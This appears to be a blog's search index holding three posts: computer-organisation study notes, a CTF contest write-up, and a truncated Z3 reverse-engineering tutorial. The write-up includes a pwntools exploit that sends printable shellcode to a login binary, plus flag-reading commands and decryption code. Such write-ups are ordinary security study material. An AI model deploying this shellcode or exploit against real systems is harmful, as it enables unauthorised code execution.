<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>计算机组成原理复习笔记</title>
      <link href="//fe29e5fb.html"/>
      <url>//fe29e5fb.html</url>
      
        <content type="html"><![CDATA[<h1>计算机组成原理复习笔记</h1><h2 id="1-完整描述CPU取一条指令的过程。（可参考下面图片）">1.完整描述CPU取一条指令的过程。（可参考下面图片）</h2><aside>💡 取指令完整过程:PC→MAR→M→MDR→IR  PC=PC+1<blockquote><p><strong>PC: 英文全称Programe Counter</strong> 程序计数器,保存的是下一条指令的地址。</p></blockquote><blockquote><p><strong>MAR,MDR:</strong> 两个缓冲的寄存器</p></blockquote><blockquote><p><strong>MAR:</strong> Memory Address Register</p></blockquote><blockquote><p><strong>MDR:</strong> Memory Data Register</p></blockquote><blockquote><p><strong>M</strong>: Meomory</p></blockquote><blockquote><p><strong>IR</strong>: 英文全称Instruction Register 指令寄存器，保存的是当前指令的机器码</p></blockquote><aside>💡 后续指令放在IR以后，取指令周期结束。<p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/Untitled.png" alt=""></p><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/20220614101737.png" alt=""></p><h2 id="2-请以指令JZ-S1为例，说明控制单元-CU-的输入有哪些">2.请以指令JZ S1为例，说明控制单元(CU)的输入有哪些?</h2><h3 id="CU-控制单元-的输入">CU(控制单元)的输入:</h3><ol><li>时钟信号</li><li>指令的操作码:IR里面的机器码送给ID译码</li><li>标志寄存器PSW: ZF=1 JZ才跳转</li></ol><h2 id="3-2k8的存储芯片，扩展为8k16的存储系统，描述你的设计思路。">3.2k<em>8的存储芯片，扩展为8k</em>16的存储系统，描述你的设计思路。</h2><blockquote><p>存储器字位同时扩展</p></blockquote><blockquote><p>需要芯片个数: 8k<em>16/2k</em>8=8个芯片</p></blockquote><blockquote><p>多出来的地址线做片选</p></blockquote><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220614101831856.png" alt=""></p><blockquote><p>8bit-16bit，需要2个芯片高低配合。2个芯片一组，分成4组。</p></blockquote><aside>💡 片选：使用A11,A12作为输入，经过一个2-4译码器，输出4个片选，每个片选选择一组芯片(任何时刻只有一组工作)</aside><h3 id="对应的真值表：">对应的真值表：</h3><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220614101815107.png" alt=""></p><h2 id="4-举例以下几种寻址方式的工作机制">4.举例以下几种寻址方式的工作机制</h2><p><strong>立即数寻址</strong>   <strong>直接寻址</strong>  <strong>寄存器寻址</strong> <strong>寄存器间接寻址</strong> <strong>隐含寻址</strong></p><p><strong>立即数寻址:</strong> 指令中直接给出操作数 MOV AX,100  源操作数采用立即寻址</p><p>**直接寻址：**直接给出操作数在内存中的地址  MOV AX,Var1  源操作数采用立即寻址。访问1次存储器</p><p>**寄存器寻址：**操作数在寄存器中 MOV AX,BX 源操作数和目的操作数都是寄存器寻址，访问0次存储器</p><p><strong>寄存器间接寻址:</strong> 操作数在存储器中，但是操作数的地址在寄存器中 MOV [BX],AX, 目的操作数[BX]采用的是寄存器间接寻址，访问1次存储器</p><p>**隐含寻址：**DIV DL ,被除数固定在AX里面，根据操作码就知道操作数的地址。不访问存储器</p><h1>以下说法是否正确？为什么?</h1><h2 id="程序计数器PC永远是自动加数字1">程序计数器PC永远是自动加数字1.</h2><p>答: 错</p><blockquote><p>在取出当前指令中，PC加1, 加一条指令的长度。</p></blockquote><blockquote><p>如果碰到转移指令(jmp,ja,jb,jz,call,ret等)，直接把IR中的地址码赋给PC。</p></blockquote><aside>💡 总结，两种情况，正常情况加一，遇跳转则赋值</aside><h2 id="简单说明-数字，西文字符、汉字、音频、图形、图像、视频在计算机中的编码方式">简单说明 数字，西文字符、汉字、音频、图形、图像、视频在计算机中的编码方式</h2><p>**数字：**原码 反码  补码  补码让符号位直接参与运算。</p><p>**西文字符：**ASCII  小写字母&gt;大写字母&gt;数字&gt;控制字符（ascall码大小顺序，比如a的ascll码97&gt;A的ascll码65）</p><p><strong>汉字:</strong> 输入码  机内码 国标码 字形码 汉字在计算机中占2个字节</p><p>**音频、图形、图像、视频：**采样  量化  编码（三步走）</p><h2 id="什么是硬布线控制器？如何设计？">什么是硬布线控制器？如何设计？</h2><p>**硬布线控制器：**采用不同的逻辑电路产生固定的时序控制信号，从而实现不同的指令操作。</p><p><strong>设计分3步：</strong></p><ol><li>进行微操作的综合</li><li>构造真值表(输入: 时钟信号，PSW, 操作码; 输出：微操作)。然后求出表达式，并化简，得到最简表达式</li><li>用 <strong>与门</strong>、<strong>或门</strong>、<strong>非门</strong> 来实现逻辑电路。</li></ol><h2 id="描叙CPU内部以下部件的作用">描叙CPU内部以下部件的作用</h2><p><strong>PC  IR  ID  PSW   时序部件  ALU  微操作控制部件(CU)</strong></p><p><strong>PC: 保存的是下一条指令的地址，正常加1，碰到跳转指令直接赋值</strong></p><p><strong>IR: 取出来的指令放在IR中</strong></p><p><strong>ID: 将IR中存放的机器指令进行译码，译出操作码。</strong></p><p><strong>PSW: 标志寄存器,用来存放上一次运算后影响的标志信息，如进位标志CF,符号标志SF,为0标志ZF. 上一次运算的结果为0，则ZF=1</strong></p><p><strong>时序部件: 产生计算机所需的各种时序信号，计算机中的控制信号具有很强的定时性。</strong></p><p><strong>ALU: 算术逻辑单元，完成所有的算术逻辑运算。</strong></p><p><strong>微操作控制部件: 产生各种控制信号，输入有3个:指令的操作码、时钟信号、PSW的状态</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> 课程笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>国赛部分wp</title>
      <link href="//338ebf9b.html"/>
      <url>//338ebf9b.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220530113631303.png" alt=""></p><blockquote><p>这是比赛结束后写的，没有容器了。。。。</p></blockquote><h1>Crypto</h1><h2 id="签到电台">签到电台</h2><blockquote><p>根据提示查看，公众号里面查看</p></blockquote><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220530114121887.png" alt=""></p><p>下发容器里面，有一个密码本，用上面对应的7个电码一一对应相加，进位舍掉</p><p>最后得到的数字先点…打开s，然后发包/send?msg=xxx(xxx为你算出的密码)</p><p>flag就出来了</p><blockquote><p>/send?msg=s(发送的数字里面不包括s。。。。没学过web，算了好几遍，一直以为是自己算错了，结果是包含了s。。。。。。)</p></blockquote><h2 id="基于挑战码的双向认证-基于挑战码的双向认证2">基于挑战码的双向认证&amp;基于挑战码的双向认证2</h2><p>这是一个非预期解</p><blockquote><p>经过师傅们的提示可以直接用find命令查找flag，把我惊到了</p></blockquote><p>我用的xshell进行的ssh连接</p><p>进入服务器后</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / | grep flag</span><br></pre></td></tr></table></figure><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220530114319857.png" alt=""></p><p>然后</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /root/cube-shell/instance/flag_server</span><br><span class="line">ls</span><br><span class="line">cat flag1.txt</span><br><span class="line">cat flag2.txt</span><br></pre></td></tr></table></figure><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220530114345241.png" alt=""></p><p>这道非预期解非常的秀</p><h1>PWN</h1><h2 id="login-nomal">login-nomal</h2><p>附件：<a href="https://wwu.lanzouj.com/iuS9X05mjj2d">https://wwu.lanzouj.com/iuS9X05mjj2d</a></p><p>简单checksec和file看一下</p><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220530114403054.png" alt=""></p><h3 id="这里是登录检测：">这里是登录检测：</h3><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220530114419490.png" alt=""></p><h3 id="这里是一个菜单：">这里是一个菜单：</h3><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220530114456357.png" alt=""></p><p>菜单选1的时候，msg传入&quot;ro0t&quot;即可将标记位标记上</p><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220530114518371.png" alt=""></p><p>菜单选2的话，会检查a1数组是否可见，以及会检测一些标记位是否被标记，然后就直接执行 写入的shellcode</p><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220530114550067.png" alt=""></p><p>菜单选3，就一个退出</p><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220530114614612.png" alt=""></p><p>这道题难点就shellcode的可见字符的编写</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shellcode =</span><br><span class="line"><span class="string">&#x27;Rh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O</span></span><br><span class="line"><span class="string">0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&#x27;</span></span><br></pre></td></tr></table></figure><p>shellcode的来源，学成之后补一下</p><h2 id="exp">exp:</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./login&#x27;</span>)</span><br><span class="line"><span class="comment"># p = remote(&#x27;101.201.144.12&#x27;,36203)</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;&gt;&gt;&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;opt:1\\r\\nmsg:ro0t\\r\\n&#x27;</span>)</span><br><span class="line">shellcode = <span class="string">b&#x27;Rh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&#x27;</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;&gt;&gt;&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;opt:2\\r\\nmsg:&#x27;</span>+shellcode+<span class="string">b&#x27;\\r\\n&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1>reverse</h1><h2 id="baby-tree"><em><strong>*baby_tree*</strong></em></h2><p>附件：<a href="https://wwu.lanzouj.com/iu10S05mjiid">https://wwu.lanzouj.com/iu10S05mjiid</a></p><p>发现是.ast文件</p><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220530114636506.png" alt=""></p><p>百度了一下</p><p>是js里的ast抽象语法树</p><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220530114721829.png" alt=""></p><p><a href="https://www.cxyzjd.com/article/weixin_35802555/113045792">https://www.cxyzjd.com/article/weixin_35802555/113045792</a></p><p>我们用vs code打开看一下</p><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220530114758150.png" alt=""></p><p>一堆看不懂的语法</p><p>这里应该是加密后的数据</p><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220530114816605.png" alt=""></p><p>这里看到有一个异或</p><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220530114838802.png" alt=""></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> enc[] = &#123; <span class="number">88</span>, <span class="number">35</span>, <span class="number">88</span>, <span class="number">225</span>, <span class="number">7</span>, <span class="number">201</span>, <span class="number">57</span>, <span class="number">94</span>, <span class="number">77</span>, <span class="number">56</span>, <span class="number">75</span>, <span class="number">168</span>, <span class="number">72</span>,</span><br><span class="line"><span class="number">218</span>, <span class="number">64</span>, <span class="number">91</span>, <span class="number">16</span>, <span class="number">101</span>, <span class="number">32</span>, <span class="number">207</span>, <span class="number">73</span>, <span class="number">130</span>, <span class="number">74</span>, <span class="number">128</span>, <span class="number">76</span>, <span class="number">201</span>, <span class="number">16</span>, <span class="number">248</span>, <span class="number">41</span>, <span class="number">205</span>, <span class="number">103</span>,</span><br><span class="line"><span class="number">84</span>, <span class="number">91</span>, <span class="number">99</span>, <span class="number">79</span>, <span class="number">202</span>, <span class="number">22</span>, <span class="number">131</span>, <span class="number">63</span>, <span class="number">255</span>, <span class="number">20</span>, <span class="number">16</span> &#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> key[] = <span class="string">&quot;y345&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> r0, r1, r2, r3, tmp;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">38</span>; i &gt; <span class="number">-1</span>; i--) &#123;</span><br><span class="line">r0 = enc[i + <span class="number">0</span>];</span><br><span class="line">r1 = enc[i + <span class="number">1</span>];</span><br><span class="line">r2 = enc[i + <span class="number">2</span>];</span><br><span class="line">r3 = enc[i + <span class="number">3</span>];</span><br><span class="line">tmp = key[<span class="number">3</span>];</span><br><span class="line">key[<span class="number">3</span>] = key[<span class="number">2</span>];</span><br><span class="line">key[<span class="number">2</span>] = key[<span class="number">1</span>];</span><br><span class="line">key[<span class="number">1</span>] = key[<span class="number">0</span>];</span><br><span class="line">key[<span class="number">0</span>] = tmp;</span><br><span class="line">enc[i + <span class="number">0</span>] = r2 ^ key[<span class="number">2</span>];</span><br><span class="line">enc[i + <span class="number">1</span>] = r3 ^ key[<span class="number">3</span>];</span><br><span class="line">enc[i + <span class="number">2</span>] = ((key[<span class="number">0</span>] + (enc[i + <span class="number">0</span>] &gt;&gt; <span class="number">4</span>)) &amp; <span class="number">0xFF</span>) ^ r0;</span><br><span class="line">enc[i + <span class="number">3</span>] = ((key[<span class="number">1</span>] + (enc[i + <span class="number">1</span>] &gt;&gt; <span class="number">2</span>)) &amp; <span class="number">0xFF</span>) ^ r1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">42</span>; i++)&#123;</span><br><span class="line">std::cout &lt;&lt; enc[i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">import</span> com.sun.javaws.exceptions.UnsignedAccessViolationException;</span><br><span class="line"><span class="keyword">import</span> com.sun.xml.internal.ws.wsdl.writer.UsingAddressing;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Description（描述）:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @DATe&amp;TIME（创建时间）: 2022/5/30 - 10:59</span></span><br><span class="line"><span class="comment"> * @Project_name（项目名）: re</span></span><br><span class="line"><span class="comment"> * @Package_name（包名）: PACKAGE_NAME</span></span><br><span class="line"><span class="comment"> * @Author（作者）: thestar</span></span><br><span class="line"><span class="comment"> * @version（版本）: 1.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TreeFlag</span> &#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">char</span>[] data = &#123;<span class="number">88</span>, <span class="number">35</span>, <span class="number">88</span>, <span class="number">225</span>, <span class="number">7</span>, <span class="number">201</span>, <span class="number">57</span>, <span class="number">94</span>, <span class="number">77</span>, <span class="number">56</span>, <span class="number">75</span>, <span class="number">168</span>, <span class="number">72</span>,</span><br><span class="line">                <span class="number">218</span>, <span class="number">64</span>, <span class="number">91</span>, <span class="number">16</span>, <span class="number">101</span>, <span class="number">32</span>, <span class="number">207</span>, <span class="number">73</span>, <span class="number">130</span>, <span class="number">74</span>, <span class="number">128</span>, <span class="number">76</span>, <span class="number">201</span>, <span class="number">16</span>, <span class="number">248</span>, <span class="number">41</span>, <span class="number">205</span>, <span class="number">103</span>,</span><br><span class="line">                <span class="number">84</span>, <span class="number">91</span>, <span class="number">99</span>, <span class="number">79</span>, <span class="number">202</span>, <span class="number">22</span>, <span class="number">131</span>, <span class="number">63</span>, <span class="number">255</span>, <span class="number">20</span>, <span class="number">16</span>&#125;;</span><br><span class="line">        <span class="keyword">char</span>[] key = <span class="string">&quot;y345&quot;</span>.<span class="built_in">toCharArray</span>();</span><br><span class="line">         <span class="keyword">char</span> r0,r1,r2,r3,tmp;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">38</span>; i&gt;=<span class="number">0</span> ; i--) &#123;</span><br><span class="line">            r0 = data[i+<span class="number">0</span>];</span><br><span class="line">            r1 = data[i+<span class="number">1</span>];</span><br><span class="line">            r2 = data[i+<span class="number">2</span>];</span><br><span class="line">            r3 = data[i+<span class="number">3</span>];</span><br><span class="line">            tmp = key[<span class="number">3</span>];</span><br><span class="line">            key[<span class="number">3</span>] = key[<span class="number">2</span>];</span><br><span class="line">            key[<span class="number">2</span>] = key[<span class="number">1</span>];</span><br><span class="line">            key[<span class="number">1</span>] = key[<span class="number">0</span>];</span><br><span class="line">            key[<span class="number">0</span>] = tmp;</span><br><span class="line">            data[i+<span class="number">0</span>] = (<span class="keyword">char</span>)(r2^key[<span class="number">2</span>]);</span><br><span class="line">            data[i+<span class="number">1</span>] = (<span class="keyword">char</span>)(r3^key[<span class="number">3</span>]);</span><br><span class="line">            data[i+<span class="number">2</span>] = (<span class="keyword">char</span>)(((key[<span class="number">0</span>]+(data[i+<span class="number">0</span>]&gt;&gt;<span class="number">4</span>))&amp;<span class="number">0xFF</span>) ^ r0);</span><br><span class="line">            data[i+<span class="number">3</span>] = (<span class="keyword">char</span>)(((key[<span class="number">1</span>]+(data[i+<span class="number">1</span>]&gt;&gt;<span class="number">2</span>))&amp;<span class="number">0xFF</span>) ^ r1);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">42</span>; i++) &#123;</span><br><span class="line">            System.out.<span class="built_in">print</span>(data[i]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 比赛wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>复现Z3巧解逆向</title>
      <link href="//9b646969.html"/>
      <url>//9b646969.html</url>
      
        <content type="html"><![CDATA[<h1>Z3巧解逆向</h1><p>源文件：<a href="https://wwu.lanzouj.com/ihKfb05mj9ri">https://wwu.lanzouj.com/ihKfb05mj9ri</a></p><h2 id="z3-求解器是什么？"><em><strong>*z3 求解器是什么？*</strong></em></h2><blockquote><p>z3是由微软公司开发的一个优秀的SMT求解器（也就定理证明器），它能够检查逻辑表达式的可满足性</p></blockquote><p>简单来说，就是解方程</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mo>−</mo><mi>y</mi><mo>=</mo><mo>=</mo><mn>3</mn></mrow><annotation encoding="application/x-tex">x-y == 3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">3</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>3</mn><mi>x</mi><mo>−</mo><mn>8</mn><mi>y</mi><mo>=</mo><mo>=</mo><mn>4</mn></mrow><annotation encoding="application/x-tex">3x-8y == 4</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">3</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8388800000000001em;vertical-align:-0.19444em;"></span><span class="mord">8</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">4</span></span></span></span></p><p>z3代码如下:</p><p>ipython 交互</p><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220530001256968.png" alt=""></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">1</span>]: <span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">In [<span class="number">2</span>]: x = Int(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">3</span>]: y = Int(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">4</span>]: solver = Solver()</span><br><span class="line"></span><br><span class="line">In [<span class="number">5</span>]: solver.add(x-y==<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">6</span>]: solver.add(<span class="number">3</span>*x - <span class="number">8</span>*y == <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">7</span>]: solver.check()</span><br><span class="line">Out[<span class="number">7</span>]: sat</span><br><span class="line"></span><br><span class="line">In [<span class="number">8</span>]: solver.model()</span><br><span class="line">Out[<span class="number">8</span>]: [y = <span class="number">1</span>, x = <span class="number">4</span>]</span><br></pre></td></tr></table></figure><h2 id="ok-我们已经了解了z3，现在来看题">ok,我们已经了解了z3，现在来看题</h2><h3 id="题目">题目</h3><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220530001328147.png" alt=""></p><p>这是一道典型的<em>用户名-序列号</em> 形式的题目，序列号已经给出，且用户名的最后一位为p。</p><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220530001345347.png" alt=""></p><p>直接丢进ida里面看一下</p><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220530001418292.png" alt=""></p><p>刚开始想法是直接od给GetWindowTextW 下断点，找到这个地址，然后ida里面g快捷键跳转，然后不行</p><p>所以，还是ida里面吧</p><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220530001439556.png" alt=""></p><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220530001457654.png" alt=""></p><p>下面这里就是分析的代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span 